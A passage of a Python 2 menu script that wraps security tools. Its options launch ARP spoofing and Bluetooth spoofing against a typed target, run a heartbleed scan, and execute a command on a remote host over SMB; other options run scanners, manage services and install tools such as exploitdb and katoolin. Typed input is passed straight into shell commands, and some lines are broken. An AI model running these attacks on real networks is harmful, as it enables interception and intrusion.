 \  \:\~~\~~\/ \  \:\/:/ /:/ /__/:/\:\   \  \:\ \:\/:/ \  \:\ /  /:/
  \  \:\  ~~~   \  \::/ /:/  \__\/  \:\   \  \:\ \::/   \  \:\  /:/ 
   \  \:\        \  \:\/:/        \  \:\   \  \:\/:/     \  \:\/:/  
    \  \:\        \  \::/          \__\/    \  \::/       \  \::/   
     \__\/         \__\/                     \__\/         \__\/    
                             ___           ___                       ___           ___     
                            /  /\         /__/|        ___          /__/\         /  /\    
                           /  /::\       |  |:|       /  /\         \  \:\       /  /:/_   
                          /  /:/\:\      |  |:|      /  /:/          \  \:\     /  /:/ /\  
                         /  /:/~/:/    __|  |:|     /__/::\      _____\__\:\   /  /:/_/::\ 
                        /__/:/ /:/___ /__/\_|:|____ \__\/\:\__  /__/::::::::\ /__/:/__\/\:\\
                        \  \:\/:::::/ \  \:\/:::::/    \  \:\/\ \  \:\~~\~~\/ \  \:\ /~~/:/
                         \  \::/~~~~   \  \::/~~~~      \__\::/  \  \:\  ~~~   \  \:\  /:/ 
                          \  \:\        \  \:\          /__/:/    \  \:\        \  \:\/:/  
                           \  \:\        \  \:\         \__\/      \  \:\        \  \::/   
                            \__\/         \__\/                     \__\/         \__\/    

     """) + end
     print(snpo)
     snaw = white + ("   01 == Sniffing \n   02 == Poising\n   03 == Bluetooth\n   00 == Main Menu\n") + end
     print(snaw)
     snraw = raw_input(red + "Sniffing & Poising :" + end)
     if(snraw=="1"):
       os.system("tcpdump")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:Don't Be Sheep:." + end)#http://idsjqkcneysjf81h39o36.clos/
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice      

     elif(snraw=="2"):
       poiraw = raw_input(lightblue + "\nTarget :" + end)
       os.system("arpspoof " + poiraw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Don't Be Sheep:." + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice   

     elif(snraw=="3"):
       os.system("spooftooph -s")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Don't Be Sheep:." + end)
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice   

     elif(snraw=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)


   elif(choice=="6"):
     clear()
     ser = darkblue + ("""                                                                         
      #######                                                             
    /       ###                                  #                        
   /         ##                                 ###                       
   ##        #                      ##           #                        
    ###                             ##                                    
   ## ###           /##  ###  /###   ##    ### ###       /###      /##    
    ### ###        / ###  ###/ #### / ##    ### ###     / ###  /  / ###   
      ### ###     /   ###  ##   ###/  ##     ### ##    /   ###/  /   ###  
        ### /##  ##    ### ##         ##      ## ##   ##        ##    ### 
          #/ /## ########  ##         ##      ## ##   ##        ########  
           #/ ## #######   ##         ##      ## ##   ##        #######   
            # /  ##        ##         ##      ## ##   ##        ##        
  /##        /   ####    / ##         ##      /  ##   ###     / ####    / 
 /  ########/     ######/  ###         ######/   ### / ######/   ######/  
/     #####        #####    ###         #####     ##/   #####     #####   
|                                                                         
 \)                                                                       
     """) + end
     print(ser)
     serv = white + ("""
     01 == Service Apache2
     02 == Service Bluetooth
     03 == Service SSH
     04 == Service Tor
     05 == Service Network Manager
     06 == Service Networking
     07 == Service Vmware
     08 == Service Http & nginx
     09 == Service Postgresql
     10 == Service Metasploit
     00 == Service Main Menu

     """) + end
    
     print(serv)
     
     sraw = raw_input(red + "Select a Service :" + end)
     global sraw
     print("\n")
     if(sraw=="1"):
       os.system("service apache2 status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       seap = raw_input(purple + "Service Apache2 ? : " + end)
       if(seap=="st"):
         os.system("service apache2 start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)#2OGD0Ezx.dafy
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       
       else:
         os.system("service apache2 stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="2"):
       os.system("service bluetooth status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       print("\n")
       seba = raw_input(purple + "Service Bluetooth ? :" + end)
       if(seba=="st"):
         os.system("service bluetooth start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)      
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(seba=="sp"):
         os.system("service bluetooth stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)     
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

      
     elif(sraw=="3"):
       os.system("service ssh status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       shh = raw_input(purple + "Service SSH ? :" + end)
       if(shh=="st"):
         os.system("service ssh start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)     
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(shh=="sp"):
         os.system("service ssh stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)#31-37-41-43-47-53-59  
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="4"):
       os.system("service tor status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       toraw = raw_input(purple + "Service Tor ? :" + end)
       if(toraw=="st"):
         os.system("service tor start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)  
         clear()
         print(ser)
         print(serv)
         poraw = raw_input("Service :")

       elif(toraw=="sp"):
         os.system("service tor stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="5"):
       os.system("service network-manager status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       nmra = raw_input(purple + "Service Network Manager ? :" + end)
       if(nmra=="st"):
         os.system("service network-manager start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    
      
       elif(nmra=="sp"):
         os.system("service network-manager stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="6"):
       os.system("service networking status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       ntraw = raw_input(purple + "Service Networking ? :" + end)
       if(ntraw=="st"):
         os.system("service networking start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(ntraw=="sp"):
         os.system("service networking stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="7"):
       os.system("service vmware status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       vmraw = raw_input(purple + "Service Vmware ? :" + end)
       if(vmraw=="st"):
         os.system("service vmware start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(vmraw=="sp"):
         os.system("service vmware stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="8"):
       os.system("service nginx status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       ixy = raw_input(purple + "Service Http/nginx ? :" + end)
       if(ixy=="st"):
         os.system("service nginx start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(ixy=="sp"):
         os.system("service nginx stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

      
     elif(sraw=="9"):
       os.system("service postgresql status")
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       pstra = raw_input(purple + "Service Postgresql ? :" + end)
       if(pstra=="st"):
         os.system("service postgresql start")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(pstra=="sp"):
         os.system("service porsgresql stop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="10"):
       print yellow + ("\nService Start == st\nService Stop == sp\n") + end
       mtraw = raw_input(purple + "Service Metasploit ? :" + end)
       if(mtraw=="st"):
         os.system("msfstart")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    

       elif(mtraw=="sp"):
         os.system("msfstop")
         raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                     .:Tik Tak Time Is Going:." + end)         
         clear()
         print(banner) 
         print(author)
         print(menu)
         choice    


     elif(sraw=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)
         
     else:
      clear()
      print(banner) 
      print(author)
      print(menu)        

   elif(choice=="7"):
     clear()
     pr = darkblue + ('''
  ,ggggggggggg,                                                                
dP"""88""""""Y8,                  I8                                    ,dPYb,
Yb,  88      `8b                  I8                                    IP'`Yb
 `"  88      ,8P               88888888                                 I8  8I
     88aaaad8P"                   I8                                    I8  8'
     88""""",gggggg,    ,ggggg,   I8     ,ggggg,    ,gggg,    ,ggggg,   I8 dP 
     88     dP""""8I   dP"  "Y8gggI8    dP"  "Y8gggdP"  "Yb  dP"  "Y8gggI8dP  
     88    ,8'    8I  i8'    ,8I ,I8,  i8'    ,8I i8'       i8'    ,8I  I8P   
     88   ,dP     Y8,,d8,   ,d8',d88b,,d8,   ,d8',d8,_    _,d8,   ,d8' ,d8b,_ 
     88   8P      `Y8P"Y8888P"  8P""Y8P"Y8888P"  P""Y8888PPP"Y8888P"   8P'"Y88

     ''') + end
     print(pr)
     pro = white + ("""
     01 == Show All Connections 
     02 == SSL Analysis
     03 == DNS Analysis
     04 == SMB Analysis
     05 == ICMP Analyis
     06 == ARP Analysis
     00 == Main Menu

     """) + end
     print(pro)
     prow = raw_input(red + "Protocol Scan :" + end)
     if(prow=="1"):
       os.system("netstat -l -a -v")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)#77777777.dafy
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice    

     elif(prow=="2"):
       slaw = raw_input(green + "\nTarget :" + end)
       os.system("sslyze --regular --heartbleed " + slaw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(prow=="3"):
       dnra = raw_input(green + "\nTarget/Url :" + end)
       os.system("dmitry -s " + dnra)
       os.system("urlcrazy -p " + dnra)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(prow=="4"):
       snmpaw = raw_input(green + "\nTarget :" + end)
       os.system("smbmap -H " + snmpaw +  " -x 'ipconfig/all'")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(prow=="5"):
       icraw = raw_input(green + "\nTarget :" + end)
       os.system("nmap -PR -PM " + icraw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(prow=="6"):
       arraw = raw_input(green + "\nTarget :" + end)
       os.system("arp -e ")
       os.system("arp-scan " + arraw)
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:We Are A Nothing:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  
     

     elif(prow=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)
         
     else:
      clear()
      print(banner) 
      print(author)
      print(menu)
        
   elif(choice=="8"):
     clear()
     maban = darkblue + ("""
     _______  _______  _                 _______  _______  _______ 
    (       )(  ___  )( \      |\     /|(  ___  )(  ____ )(  ____ \\
    | () () || (   ) || (      | )   ( || (   ) || (    )|| (    \/
    | || || || (___) || |      | | _ | || (___) || (____)|| (__    
    | |(_)| ||  ___  || |      | |( )| ||  ___  ||     __)|  __)   
    | |   | || (   ) || |      | || || || (   ) || (\ (   | (      
    | )   ( || )   ( || (____/\| () () || )   ( || ) \ \__| (____/\\
    |/     \||/     \|(_______/(_______)|/     \||/   \__/(_______/
    """) + end
     mals = white + ("""
     01 == Backdoor Analyis
     02 == Malware Analyis
     03 == Rootkit Analyis
     00 == Main Menu
     """) + end
     print(maban)
     print(mals)
     maraw = raw_input(red + "Malware Analyis :" + end)
     if maraw=="1":
       print(lightblue + "\nOpen Your Browser and Enter This Link \n\n  http://localhost:9999/autopsy\n" + end)
       os.system("autopsy")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Maybe ,Maybe not:." + end)#CrEdEdlv.dafy , http://blkh4ylofapg42tj6ht565klld5i42dhjtysvsnnswte4xt4uvnfj5qd.onion/
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(maraw=="2"):
       os.system("chkrootkit -q -d -n")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Maybe ,Maybe not:." + end)       
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  


     elif(maraw=="3"):
       os.system("rkhunter --check --sk --nomow -x")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:Maybe ,Maybe not:." + end)#21 49'08.88"S 114 10'08.88"E
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(maraw=="0"):
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  
  
     else:
      clear()
      print(banner) 
      print(author)
      print(menu)
     
   elif(choice=="9"):
     clear()
     instban = darkblue + ("""  
    .                       .         *               .       
 __  .__   __.      _______.___________.    ___       __       __     . 
|  | |  \ |  |     /       |           |   /   \  x  |  |     |  |                 A long time ago in a galaxy far away...
|  | |   \|  | *  |   (----`---|  |----`  /  ^  \    |  |     |  |     
|  | |  . `  |   . \   \   +   |  |   .  /  /_\  \ . |  |  ,  |  |     
|  | |  |\   | .----)   |      |  |     /  _____  \  |  `----.|  `----. X
|__| |__| \__| |_______/  .    |__|    /__/     \__\ |_______||_______|
             ,                       ,            .
 *                  .                     .                     ,         .
     """) + end
     insta = white + ("""
     01 == Fully Ugrade All Systems
     02 == Metasploit Unleashed     
     03 == Shodan HQ              
     04 == Snort Ids/Ips          
     05 == Firewall             
     06 == AnonSurf             
     07 == Searchsploit            
     08 == Nmap                    
     09 == Burp Suite              
     10 == Johnny                  
     11 == Katoolin                
     00 == Main Menu

     """) + end
     print(instban)
     print(insta)
     instcho = raw_input(red + "Install :" + end)
     if(instcho=="1"):
       os.system("apt-get update && apt-get upgrade && apt-get dist-upgrade") or ("apt-get full insteal")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="2"):
       os.system("apt-get install metasploit")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="3"):
       os.system("easy_install shodan") or ("apt-get install shodan")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="4"):
       os.system("apt-get install snort")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="5"):
       os.system("apt-get install ufw")
       os.system("ufw")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="6"):
       os.system("apt-get install anonsurf")
       os.system("anonsurf start")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="7"):
       os.system("git clone -s https://github.com/offensive-security/exploitdb.git /root/.DestroyeR/Tools/Searchsploit")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="8"):
       os.system("https://github.com/nmap/nmap /root/.DestroyeR/Tools/Nmap")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="9"):
       os.system("wget https://portswigger.net/burp/releases/download?product=community&version=1.7.36&type=linux /root/.DestroyeR/Tools/Burp")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="10"):
       os.system("git clone https://github.com/shinnok/johnny.git /root/.DestroyeR/Tools/Johnny")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)
       choice  

     elif(instcho=="11"):
       os.system("git clone https://github.com/LionSec/katoolin.git /root/.DestroyeR/Tools/katoolin && python katoolin.py")
       raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                         .:This Is A Hoax:." + end)  
       clear()
       print(banner) 
       print(author)
       print(menu)

     else:
      clear()
      print(banner) 
      print(author)
      print(menu)

   elif(choice=="10"):
     clear()
     #crearte a banner
     thanks = (lightblue + """                                                       Author= {D4r7h V4d3R}

                                                      .:\--Special Thanks--/:.

                                                          [L3g3nd  M45t3R]
                                                          [Linus Torvalds]
                                                             [pwaller]
                                                             [Fyodor ]
                                                     [HD Moore and Rapid7 Team]                                                       
                                                          [Github Family]
     """ + end)
     print(thanks)
     raw = raw_input (yellow + "\n\n                                       \----------(Click Enter Back to Main Menu)----------/\n                                                        .:To Be Continue:." + end)
     clear()
     print(banner) 
     print(author)
     print(menu)
      

   elif(choice=="11"):
     print(lightblue + "\n\n        Have A Nice Day\n" + end)#New World...
     os.system("exit")
     break
  

   else:
     clear()
     print(banner) 
     print(author)
     print(menu)

     #n0n4m3@ctemplar.com


